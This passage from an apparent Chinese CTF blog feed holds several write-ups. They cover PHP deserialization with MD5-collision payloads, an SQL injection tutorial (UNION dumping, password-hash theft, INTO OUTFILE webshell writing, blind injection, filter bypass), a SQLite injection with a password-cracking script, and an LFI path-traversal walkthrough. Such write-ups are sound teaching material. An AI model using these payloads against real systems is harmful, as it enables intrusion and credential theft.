$_POST[&#39;a&#39;]) &amp;&amp; (md5($_POST[&#39;b&#39;]) === md5($_POST[&#39;a&#39;])))&#123;        unserialize($_POST[&#39;c&#39;]);    &#125;&#125;</code></pre><p>需要绕过wakeup的执行.</p><pre><code class="php">if(!file_get_contents(&quot;./sandbox/lock.lock&quot;))</code></pre><p>这里需要进行绕过而file_get_contents()读到文件则返回读到的数据,而没有读到则返回false,而这里包含一个取反函数所以就只能读不到,这里将设法将其删除. </p><p>这里首先访问.&#x2F;sandbox&#x2F;lock.lock文件发现存在</p><p>这里了解到可以利用 <a href="https://www.cnblogs.com/w0s1np/p/14641597.html">ZipArchive</a> 的open方法进行删除这里的原因是由于原先wakeup的调用本来就为Ctf类的open方法而这里就找到了<a href="https://www.cnblogs.com/w0s1np/p/14641597.html">ZipArchive</a> 的open方法经过实验这里open总共有两个参数第二个参数的是要传入一个预定义常量而8的预定义常量含义大概是将文件进行关闭,防止产生报错.而不使用参数经过实验好像也可删除文件.</p><p>之后得到脚本</p><pre><code class="php">&lt;?phpclass Jesen &#123;    public $filename = &#39;./sandbox/lock.lock&#39;;    public $content = 8;    public $me;&#125;$a = new  Jesen();$zip  = new  ZipArchive;$a-&gt;me = $zip;$b = serialize($a);$b = str_replace(&#39;&quot;:3:&#39;,&#39;&quot;:4:&#39;,$b);echo $b;echo &quot;\n&quot;;</code></pre><p>这里仅仅得到了c的值而a与b可以通过php的弱类型来绕过</p><pre><code class="php">($_POST[&#39;b&#39;] != $_POST[&#39;a&#39;]) &amp;&amp; (md5($_POST[&#39;b&#39;]) === md5($_POST[&#39;a&#39;])</code></pre><p> 其实php为了可以上传一个数组，会把结尾带一对中括号的变量，例如 xxx[]的name（就是$_POST中的key） </p><p>&#x3D;&#x3D;&#x3D;会比较类型，这个时候可以用到PHP中md5()函数无法处理数组（会返回NULL）来实现绕过。</p><p>payload: &#x2F;?a[]&#x3D;1&amp;b[]&#x3D;2 (上面&#x3D;&#x3D;的例子也可以用数组绕过)综上payload为</p><pre><code>a[]=1&amp;b[]=2&amp;c=O:5:&quot;Jesen&quot;:4:&#123;s:8:&quot;filename&quot;;s:19:&quot;./sandbox/lock.lock&quot;;s:7:&quot;content&quot;;i:8;s:2:&quot;me&quot;;O:10:&quot;ZipArchive&quot;:5:&#123;s:6:&quot;status&quot;;i:0;s:9:&quot;statusSys&quot;;i:0;s:8:&quot;numFiles&quot;;i:0;s:8:&quot;filename&quot;;s:0:&quot;&quot;;s:7:&quot;comment&quot;;s:0:&quot;&quot;;&#125;&#125;</code></pre><p>上传完之后再次访问.&#x2F;sandbox&#x2F;lock.lock文件发现并不存在</p><p>这里便绕过第一步了</p><p>这里直接需要b的值</p><pre><code class="php">echo file_get_contents(substr($_POST[&#39;b&#39;],0,30));</code></pre><p>而又需要绕过md5强类型碰撞</p><pre><code class="php">($_POST[&#39;b&#39;] != $_POST[&#39;a&#39;]) &amp;&amp; (md5($_POST[&#39;b&#39;]) === md5($_POST[&#39;a&#39;])</code></pre><p>这里选用fastcoll软件进行生成,直接将1.txt拖动到fastcoll上面产生两个文件使用Hash软件进行对比md5值</p><pre><code class="txt">./../../../../../../../../flag</code></pre><p>这里由于b对前30个字符进行截取所以直接产生30个.而这里产生的两个文件需要进行url编码而这里经过验证一般软件的url编码使用之后并不正确</p><p>而使用php内置的urlencode()函数才能正常</p><pre><code class="php">&lt;?phpfunction readmyfile($path)&#123;    $fh=fopen($path,&quot;rb&quot;);    $data=fread($fh,filesize($path));    fclose($fh);    return$data;&#125;//echo md5( (readmyfile(&quot;1.txt&quot;)));//echo &#39;============================&#39;;echo urlencode(readmyfile(&quot;1.txt&quot;));//echo md5( (readmyfile(&quot;2.txt&quot;)));echo &#39;============================&#39;;echo urlencode(readmyfile(&quot;2.txt&quot;));</code></pre><p>这时c的值可以进行另外的赋值因为他必须对Ctf类的open()函数进行调用才能执行到</p><pre><code class="php">echo file_get_contents(substr($_POST[&#39;b&#39;],0,30));</code></pre><pre><code class="php">&lt;?phpclass Jesen&#123;    public$filename;    public$content;    public$me;&#125;$a = new Jesen();echo serialize($a);</code></pre><p>产生的c与前两个进行组合产生最终payload</p><pre><code>a=.%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%E9%86v%A1b%E9g%7B%C8%8A%84q%C3%7D%E0%B8%83%9B%EA%1C%E1%86%19%17%5E%3A%11%B9%A2%AB%E5%9C%1B%B6%0D%3E%84%D6%F2%8F%E8%EF1%BFm%95%F7%BC%87%C2%D9k%5D4%F1%FE%D7%F7%7B%A5%A0%DF%5D%C5P%BB%0D%27%12%D1%0DlLR%B1%D7%B4%22%D3u%60H%276%BD+%8At%C9%BF%5BOLOAp%C6%C8%AA%82k%93%9E%E8%BC%EB%B8s2%87I%DC%18%2F_I%22%F0%F3%CF%5D%05%9D%B2%0B%7DU&amp;b=.%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%E9%86v%A1b%E9g%7B%C8%8A%84q%C3%7D%E0%B8%83%9Bj%1C%E1%86%19%17%5E%3A%11%B9%A2%AB%E5%9C%1B%B6%0D%3E%84%D6%F2%8F%E8%EF1%BF%ED%95%F7%BC%87%C2%D9k%5D4%F1%FE%D7%F7%FB%A5%A0%DF%5D%C5P%BB%0D%27%12%D1%0DlLR%B1%D7%B4%22%D3u%60H%A76%BD+%8At%C9%BF%5BOLOAp%C6%C8%AA%82k%93%9E%E8%BC%EB%B8s%B2%86I%DC%18%2F_I%22%F0%F3%CF%5D%05%1D%B2%0B%7DU&amp;c=O:5:&quot;Jesen&quot;:3:&#123;s:8:&quot;filename&quot;;N;s:7:&quot;content&quot;;N;s:2:&quot;me&quot;;N;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bugctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入系统学习</title>
      <link href="/ctf/sql%E6%B3%A8%E5%85%A5/sql/sql-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/"/>
      <url>/ctf/sql%E6%B3%A8%E5%85%A5/sql/sql-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入系统学习"><a href="#sql注入系统学习" class="headerlink" title="sql注入系统学习"></a>sql注入系统学习</h1><h2 id="寻找及确认sql注入"><a href="#寻找及确认sql注入" class="headerlink" title="寻找及确认sql注入"></a>寻找及确认sql注入</h2><h3 id="于参数后面加一个单引号’"><a href="#于参数后面加一个单引号’" class="headerlink" title="于参数后面加一个单引号’"></a>于参数后面加一个单引号’</h3><h3 id="and于or"><a href="#and于or" class="headerlink" title="and于or"></a>and于or</h3><h3 id="加法和减法"><a href="#加法和减法" class="headerlink" title="加法和减法"></a>加法和减法</h3><pre><code>数字型不需要单引号时</code></pre><h2 id="利用sql注入"><a href="#利用sql注入" class="headerlink" title="利用sql注入"></a>利用sql注入</h2><h3 id="识别数据库"><a href="#识别数据库" class="headerlink" title="识别数据库"></a>识别数据库</h3><pre><code>asp和.net    Microsoft SQL ServerPHP            Mysql.PostgreSQLjava        Oracle.Mysql</code></pre><h4 id="基于错误识别数据库"><a href="#基于错误识别数据库" class="headerlink" title="基于错误识别数据库"></a>基于错误识别数据库</h4><pre><code>需要一条详细的报错信息</code></pre><h4 id="基于数字函数推断"><a href="#基于数字函数推断" class="headerlink" title="基于数字函数推断"></a>基于数字函数推断</h4><table><thead><tr><th>数据库服务器</th><th>函数</th></tr></thead><tbody><tr><td>Mircrosoft SQL Server</td><td>@@pack_received.@@rowcount</td></tr><tr><td>Mysql</td><td>connection_id().last_insert_id().row_count().len()</td></tr><tr><td>Oracle</td><td>BITAND(1,1).length()</td></tr><tr><td>postgreSQL</td><td>select EXTRACT(DOW FROM NOW())</td></tr></tbody></table><p>connection_id()不管值多少都是正的也就是真的,last_insert_id()这里不存在insert语句,默认情况就是返回零,也就是假.</p><p>那么如果and connection_id()数据返回正常,and last_insert_id()不返回数据我们就可以推断这个是一个mysql数据库了</p><h3 id="UNION语句提取数据"><a href="#UNION语句提取数据" class="headerlink" title="UNION语句提取数据"></a>UNION语句提取数据</h3><p>UNION语句可以合并两条或多条SELECT语句的查询结果,如果应用返回了第一条查询语句的数据,我们就可以在第一条查询语句后面注入一个UNION运算符添加一个任意查询,来提取数据,但是必须满足两个条件</p><ul><li><p>两个查询返回的列数必须相同</p><p>  可以使用NULL来尝试,由于NULL值会转成任何数据类型</p><pre><code>union select null,null,null...    这样加上去知道不返回错误order by 4    </code></pre></li><li><p>两个查询语句对于列返回的数据类型必须相同</p><pre><code>使用我们的测试字符串进行替换nullunion select user(),@@version,null</code></pre></li></ul><h3 id="枚举数据库"><a href="#枚举数据库" class="headerlink" title="枚举数据库"></a>枚举数据库</h3><p>表,列,数据存放在information_schema数据库中</p><pre><code>数据库名存放在information_schema数据库下的schemata表的schema_name字段中union select null,schema_name,null from information_shcema.schemata表名存放在information_schema数据库下tables表table_name字段中union select null,table_name,null from information_schema.tables where table_schema=&quot;wanan&quot;数据在表里union select username,password ,null from users</code></pre><h3 id="窃取哈希口令"><a href="#窃取哈希口令" class="headerlink" title="窃取哈希口令"></a>窃取哈希口令</h3><p>mysql在mysql.user表中存储哈希口令</p><pre><code>select user,password from mysql.user哈希口令是通过PASSWORD()函数计算的select password(&#39;wanan&#39;)</code></pre><h3 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h3><p>利用sql注入像服务器写文件(这里需要得到网站的绝对路径)</p><pre><code>select into outfile(dumpfile)//mysql 写文件命令select &quot;&lt;?php echo &#39;test&#39;;?&gt;&quot; into outfile &quot;/var/www/test.php&quot;;</code></pre><h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><pre><code>1.提交一个导致sql查询无效时,会返回一个通用错误页面,提交正确则会返回一个内容可被适度控制的页面2.提交一个导致sql查询无效时,会返回一个通用的错误页面,提交正确则会返回一个内容不可空页面3.提交受损或不正确的sql即不会产生错误页面,也不会以任何方式影响页面输出</code></pre><h3 id="基于布尔"><a href="#基于布尔" class="headerlink" title="基于布尔"></a>基于布尔</h3><pre><code>SUBSTRING(str,pos,len)没有len参数的形式返回一个字符串从字符串str从位置pos开始。一个len参数的形式返回len个字符长的字符串str的子串，从位置pos开始，形式使用的是标准的SQL语法。另外，也可以使用负的值为pos。在这种情况下，刚开始的子串位置的字符结尾的字符串，而不是开始。负的值可用于为pos在此函数中的任何形式的。</code></pre><pre><code>1 and SUBSTRING(user(),1,1)=&#39;a&#39;            看返回true还是false</code></pre><h3 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h3><pre><code>union select if(SUBSTRING(user(),1,4)=&#39;root&#39;,sleep(4),1),null,null</code></pre><h2 id="绕开过滤"><a href="#绕开过滤" class="headerlink" title="绕开过滤"></a>绕开过滤</h2><h3 id="大小写变种"><a href="#大小写变种" class="headerlink" title="大小写变种"></a>大小写变种</h3><pre><code>如使用strstr($id,&#39;union&#39;) strstr()函数是对大小写敏感的,所以可以大小写绕过</code></pre><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><pre><code>对数据进行url编码</code></pre><p>双url编码,但是前提是后面有一个url解码</p><h3 id="sql注释"><a href="#sql注释" class="headerlink" title="sql注释"></a>sql注释</h3><p>当仅使用strstr($id,’ ‘)过滤空格时,可以使用注释符等绕过</p><h3 id="空字符"><a href="#空字符" class="headerlink" title="空字符"></a>空字符</h3><p>通常的输入过滤器都是在应用程序之外的代码实现的。比如<a href="http://www.ichunqiu.com/course/298?bbs">入侵检测系统</a>（IDS），这些系统一般是由原生编程语言开发而成，比如C++，为什么空字节能起作用呢，就是因为在原生变成语言中，根据字符串起始位置到第一个出现空字节的位置来确定字符串长度。所以说空字节就有效的终止了字符串。</p><p> 只需要在过滤器阻止的字符串前面提供一个采用URL编码的空字节即可，例如：</p><pre><code>%00&#39; union select username,password from users where username=&#39;admin&#39; --</code></pre><h3 id="二次SQL注入"><a href="#二次SQL注入" class="headerlink" title="二次SQL注入"></a>二次SQL注入</h3><p>查询的语句所用到的变量name就是从数据库提取到的我们的用户名，所以我们可以先利用更新我们的用户名功能插入语句进数据库。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界FlatScience</title>
      <link href="/ctf/sql%E6%B3%A8%E5%85%A5/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CFlatScience/"/>
      <url>/ctf/sql%E6%B3%A8%E5%85%A5/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CFlatScience/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlite-注入引发的pdf爬取与sha1密码爆破"><a href="#sqlite-注入引发的pdf爬取与sha1密码爆破" class="headerlink" title="sqlite 注入引发的pdf爬取与sha1密码爆破"></a>sqlite 注入引发的pdf爬取与sha1密码爆破</h1><p>打开没有发现什么有用信息,扫一下后台目录</p><pre><code>python dirsearch.py -u http://111.200.241.244:52362/</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101059303.png" alt="image-20220310105938224"></p><p>挨个访问一下发现有</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101059580.png" alt="image-20220310105947523"></p><p>在admin.php页面发现</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101058568.png" alt="image-20220310105811511"></p><p>不可能注入成功</p><p>login.php登录试试发现输入单引号有报错</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101059373.png" alt="image-20220310105904267"></p><p>可以得到是sqlite数据库</p><p>这个页面查看源码看看,发现有一个debug参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101059647.png" alt="image-20220310105918595"></p><p>这里地址栏输入一下返回了部分源码</p><pre><code class="php">&lt;?phpif(isset($_POST[&#39;usr&#39;]) &amp;&amp; isset($_POST[&#39;pw&#39;]))&#123;    $user = $_POST[&#39;usr&#39;];    $pass = $_POST[&#39;pw&#39;];    $db = new SQLite3(&#39;../fancy.db&#39;);    $res = $db-&gt;query(&quot;SELECT id,name from Users where name=&#39;&quot;.$user.&quot;&#39; and password=&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;&quot;);        if($res)&#123;        $row = $res-&gt;fetchArray();    &#125;    else&#123;        echo &quot;&lt;br&gt;Some Error occourred!&quot;;    &#125;    if(isset($row[&#39;id&#39;]))&#123;        setcookie(&#39;name&#39;,&#39; &#39;.$row[&#39;name&#39;], time() + 60, &#39;/&#39;);        header(&quot;Location: /&quot;);        die();    &#125;&#125;if(isset($_GET[&#39;debug&#39;]))    highlight_file(&#39;login.php&#39;);?&gt;</code></pre><p>可以发现这里是判断查询数据是否存在,存在注入且将信息存放到了cookie中</p><p>tips：</p><pre><code class="javascript">sqlite数据库有一张sqlite_master表，里面有type/name/tbl_name/rootpage/sql记录着用户创建表时的相关信息</code></pre><p>这里构造查询用户创建表时的相关信息</p><pre><code>usr=1&#39;union select name,sql from sqlite_master--+&amp;pw=a</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101100466.png" alt="image-20220310110033355"></p><p>发现在coolie中存在有信息进行url解码得到有name,password,hint字段</p><p>构造查询name,password,hint字段</p><pre><code>usr=&#39;union select id,group_concat(name) from Users--&amp;pw=ausr=&#39;union select id,group_concat(password) from Users--&amp;pw=a</code></pre><table><thead><tr><th>name</th><th>password</th><th>hint</th></tr></thead><tbody><tr><td>admin</td><td>3fab54a50e770d830c0416df817567662a9dc85c</td><td>my fav word in my fav paper?</td></tr><tr><td>fritze</td><td>54eae8935c90f467427f05e4ece82cf569f89507</td><td>!,my love is…?</td></tr><tr><td>hansi</td><td>34b0bb7c304949f9ff2fc101eef0f048be10d3bd</td><td>,the password is password</td></tr></tbody></table><p>所以这里需要查询他的论文</p><p>首先进行pdf文件的爬取工作</p><pre><code class="python">import urllib.requestimport requestsimport re# eccbc87e4b5ce2fe28308fd9f2a7baf3.pdf 示例import urllib3&#39;&#39;&#39;eccbc87e4b5ce2fe28308fd9f2a7baf3.pdf 示例 匹配这个名称  使用正则表达式首先[]表示字符集匹配集合中的任意字符[a-fA-F0-9]原因是哈希函数是只有a-f A-F 0-9 中的字符  [a-fA-F0-9]&#123;32&#125; 表示匹配前面三十二个字符  [a-fA-F0-9]&#123;32&#125;\.pdf 表示匹配.pdf这个字符 &#39;&#39;&#39;&#39;&#39;&#39;1/3/7/8/index.html1/index.html 实例匹配后面的名字    ([0-9]&#123;1&#125;\/) &#123;1&#125;表示匹配数字一次首先将1/作为一个整体进行匹配, &#123;0,4&#125;表示匹配0次或者4次index.html表示匹配index.html字符&#39;&#39;&#39;re1 = &#39;[a-fA-F0-9]&#123;32&#125;\.pdf&#39;re2 = &#39;[0-9\/]&#123;2,2&#125;index.html&#39;pdf_list = []  # 创建一个pdf列表,用于储存pdf网址&#39;&#39;&#39;中括号[]：代表list列表数据类型，列表是一种可变序列&#39;&#39;&#39;# 获取pdfurl列表def get_pdf(url):    global pdf_list    # print(url)    req = requests.get(url)    re_1 = re.findall(re1, req.text)  # 这里使用re匹配响应中符合的pdf名称    # print(re_1)    for i in re_1:        pdf_url = url + i        pdf_list.append(pdf_url)        # print(pdf_list)    re_2 = re.findall(re2, req.text)    # print(re_2)    for j in re_2:        new_url = url + j[0:2]        # print(j[0:2])        # print(new_url)        get_pdf(new_url)    # print(pdf_list)    return pdf_list# 获取pdf文件def get_file(url):    # req = requests.get(url)    #print(len(url))    for i in range(0,len(url)):        url1 = url[i]        print(url)        req = urllib.request.urlopen(url1)# 这里使用的是urllib库的request方法的urlopen将对url发起默认get请求        filename = str(i) + &#39;.pdf&#39;        with open(f&#39;./pdf/&#123;filename&#125;&#39;, &#39;wb&#39;) as f:  # 打开一个文件并以f为代名 wb 以二进制格式打开文件只用于写入,如果文件已存在则打开文件,并从开头进行编辑,即原有内容会被删除.            block_size = 8192  # 定义一个读取量防止过大爆内存                                 如果该文件不存在,创建新文件,一般用于非文本文件如图片            while True:                buffer = req.read(block_size)  # 这里使用read方法进行读取文件默认返回bytes类型                if not buffer:  # 当buffer为零时即为假那么取反变为真跳出循环                    break                f.write(buffer)  # 进行文件的写入        print(&quot;Sucessful to download&quot; + &quot; &quot; + filename)if __name__ == &#39;__main__&#39;:    pdf_list = get_pdf(&#39;http://111.200.241.244:63725/&#39;)    #print(pdf_list)    get_file(pdf_list)    # req  = requests.get(&#39;http://111.200.241.244:63725/c4ca4238a0b923820dcc509a6f75849b.pdf&#39;)</code></pre><p> 接下来就是提取pdf里的文本信息了，我在网上找了一个pdf转txt的工具：pdftotext.exe，这个工具可以通过命令行把pdf转txt文件，由于文件相对较多，可以通过python多线程来执行，当然也可以直接手动转换。 </p><pre><code class="python">import osimport threadingdef thread(cmd):#创建一个cmd类用于通过os.system调用系统cmd    os.system(cmd)tsk=[]#创建一个列表用于存放线程对象for i in range(0,34):    filename = str(i) + &#39;.pdf&#39;#获取文件名称    filename = &#39;D:\Download\pdf\\&#39; + filename    cmd = r&quot;D:\Data\secquan\tools\编码解码\pdftotext\pdftotext.exe %s&quot;%(filename)#调用cmd的命令    print(cmd)    t = threading.Thread(target=thread(cmd))#创建线程对象    tsk.append(t)#将线程对象添加到列表中for t in tsk:    t.start()#启动线程对象</code></pre><p>进行本地密码爆破</p><pre><code class="python">import hashlibimport base64def tiqu(filename):    f = open(&#39;./pdf/&#123;&#125;&#39;.format(filename), &#39;r&#39;,errors=&#39;ignore&#39;)#这里由于并不是正常编码格式所以会产生保存而使用errors=&quot;ignore&quot;可以将报错信息进行屏蔽    doc = f.read()    f.close()    dic = doc.split(&#39; &#39;)    new_dic = []    for i in dic:        i = i.replace(&#39; &#39;, &#39;&#39;)        if i != &#39;&#39;:            new_dic.append(i)    return new_dicdef sha(word):    md = hashlib.sha1()    md.update((word + &#39;Salz!&#39;).encode(&#39;utf-8&#39;))    haxstr = md.hexdigest()    #print(haxstr)    if &#39;3fab54a50e770d830c0416df817567662a9dc85c&#39; == haxstr:        print(&quot;password:&quot; + word)        exit()if __name__ == &#39;__main__&#39;:    for i in range(0, 34):        n = tiqu(str(i) + &#39;.txt&#39;)        for k in n:            sha(k)            #print(base64.b64encode(k.encode(&quot;utf-8&quot;)))</code></pre><p>得到密码ThinJerboa用户名admin</p><p>到admin.php进行登录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101101554.png" alt="image-20220310110100433"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Web_php_wrong_nginx_config</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb_php_wrong_nginx_config/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb_php_wrong_nginx_config/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含-目录遍历-分析Weevely后门代码-写解密函数"><a href="#文件包含-目录遍历-分析Weevely后门代码-写解密函数" class="headerlink" title="文件包含,目录遍历,分析Weevely后门代码,写解密函数"></a>文件包含,目录遍历,分析Weevely后门代码,写解密函数</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208971.png" alt="1646466067424"></p><p>弹出登录</p><p>扫一下目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208978.png" alt="1646466135692"></p><p>发现</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208975.png" alt="1646466159066"></p><p><strong>hint.php</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208974.png" alt="1646466609529"></p><p> &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf 说文件的配置可能有问题,该文件应该是nginx的站点核心配置文件之一</p><p><strong>Hack.php</strong></p><p>访问改文件得到一个空白页面,猜测改文件没有直接输出任何语句</p><p><strong>&#x2F;admin | &#x2F;admin&#x2F; |&#x2F;ad,im&#x2F;?&#x2F;login | &#x2F;admin&#x2F;index.php</strong>都显示</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208977.png" alt="1646466402867"></p><p><strong>&#x2F;admin&#x2F;admin.php</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208987.png" alt="1646466466802"></p><p> 弹窗显示 <strong><code>you need to log in</code></strong> , 然后跳转到 <code>login.php</code> 页面 </p><p><strong>&#x2F;images</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208178.png" alt="1646466558803"></p><p>会跳转到&#x2F;images&#x2F;并返回403,没有可以利用的点</p><p>基本信息收集的差不多之后,我们现在有几个可以用的点</p><ol><li><strong>&#x2F;admin&#x2F;admin.php页面</strong></li></ol><p>该页面需要登录情况下才能访问,但是我们没有账号和密码,也没有注册页面,所以账号和密码登录是不太现实的.同样爆破账号密码也不太可能.现在最理想的情况是那个地方泄露了cookie,我们可以利用这个cookie以某个用户的身份进行登录</p><p>​    2. <strong>&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf 文件</strong></p><p>这个文中给出的提示,肯定有用,但是现在无法去读取这个文件,最常用的读取文件漏洞有”文件包含”与”任意文件下载(读取)”,但是需要找到可以利用的点</p><p>​    3.<strong>Hack.php页面</strong></p><p>暂时还不知道是怎么利用但是看文件名字肯定可以利用</p><h2 id="本地文件包含读取Nginx配置文件"><a href="#本地文件包含读取Nginx配置文件" class="headerlink" title="本地文件包含读取Nginx配置文件"></a>本地文件包含读取Nginx配置文件</h2><p>这里发现在访问网址时都会带上一个isLogin的cookie,这里没有任何问题,但是isLogin的值被定义为”0”<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208184.png" alt="1646467732253"></p><p>想到cookie是用来识别用户的,维持登录状态的,这里的”0”可能表示布尔值,因此手动将其该为”isLogin&#x3D;1”</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208193.png" alt="1646468011826"></p><p> 然后再访问 <code>/admin/admin.php</code> , 发现我们成功登录到了站点后台 </p><p>后台看起来有很多选项卡 , 其实大部分都是假的 , 即使有几个选项存在页面跳转 , 也都是指向 <code>index.php</code> , 没有什么问题 .</p><p>在登录时发现请求了这么一个界面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208476.png" alt="1646468601366"></p><p>可以发现请求的是后台文件index.php</p><p>其中file参数是文件名,ext参数是文件扩展名,那么这里是否存在LFI(本地文件包含漏洞)</p><ol><li><p><strong>.&#x2F;测试</strong></p><pre><code>payload=file=./index&amp;ext=php</code></pre><p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208491.png" alt="1646469038225"></p><p> 2.<strong>..&#x2F;测试</strong></p><pre><code>payload=file=../index&amp;ext=php</code></pre><p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208493.png" alt="1646469112174"></p></li></ol><p>响应结果和.&#x2F;完全相同,看起来..&#x2F;并没有被解析处理,或者说是被过滤掉了.</p><p>​    3.<strong>….&#x2F;&#x2F;测试</strong></p><p>​        既然..&#x2F;可能被过滤了,那么就重叠写为….&#x2F;&#x2F;这样如果是只过滤一次,并且过滤为空的话就可以绕过这个过滤</p><pre><code>payload=file=....//&amp;ext=php</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208502.png" alt="1646469437304"></p><p>这里页面就发生了变化不在出现please continue,这里可能因为过滤检测后..&#x2F;index.php文件不存在.导致站点自动跳转到.&#x2F;index.php主页.因此重写法可以绕过..&#x2F;过滤</p><p>​    4.<strong>测试去除ext参数值</strong></p><p>如果HTTP请求中ext&#x3D;php是必须存在且无法更改的,那么这里利用会变得十分困难.因为我们的目标是&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf文件,而不是php文件</p><pre><code>payload=file=index&amp;ext=</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208500.png" alt="1646469772066"></p><p>没有出现please continue,因此这里看到的页面可能是因为当前目录下面的index文件不存在而强制跳转到index.php</p><p>​    5.**测试去除ext参数值,并在file参数中添加文件扩展名</p><p>​        那么如何验证上述没有出现please continue字符串是因为站点中没有找到这个文件而出现的强制跳转这个猜想是正确的呢</p><pre><code>payload=file=index.php&amp;ext=</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208514.png" alt="1646470053397"></p><p>出现了please continue,说明读取到了当前目录下面的index.php,而前面的没有找到这个站点没有读取到index这个文件,直接跳转到了index.php,因此没有出现please continue</p><p>这也说明了我们上面所有的猜想都是正确的.我们可以通过重写..&#x2F;来绕过站点的过滤机制</p><p>现在我们可以直接读取到&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf</p><pre><code>payload = file=....//....//....//....///etc/nginx/sites-enabled/site.conf&amp;ext= </code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208866.png" alt="1646470290737"></p><h2 id="目录遍历漏洞拿到webshel"><a href="#目录遍历漏洞拿到webshel" class="headerlink" title="目录遍历漏洞拿到webshel"></a>目录遍历漏洞拿到webshel</h2><p>利用上面的漏洞,我们可以读取到所有已知文件名的文件,但是我们对于哪些我们不知道的文件,就没有办法读取,必须拿到其他的利用点.所以这里开始查看配置文件根据</p><h3 id="Nginx的alias的用法及与root的区别"><a href="#Nginx的alias的用法及与root的区别" class="headerlink" title="Nginx的alias的用法及与root的区别"></a>Nginx的alias的用法及与root的区别</h3><ol><li>​    toot的用法</li></ol><pre><code>location /request_path/image/ &#123;    root /local_path/image/;&#125;这样配置的结果就是当客户端请求 /request_path/image/cat.png 的时候，Nginx把请求映射为/local_path/image/request_path/image/cat.png</code></pre><ol start="2"><li><p>alias的用法</p><pre><code>location /request_path/image/ &#123;    alias /local_path/image/;&#125;这时候，当客户端请求 /request_path/image/cat.png 的时候，Nginx把请求映射为/local_path/image/cat.png</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208876.png" alt="1646474028650"></p></li></ol><p>这段代码给&#x2F;web-img目录设置了一个别名&#x2F;images&#x2F;,并且开启了autoindex</p><p> alias 用于给 localtion 指定的路径设置别名 , 在路径匹配时 , alias 会把 location 后面配置的路径丢弃掉 , 并把当前匹配到的目录指向到 alias 指定的目录 . 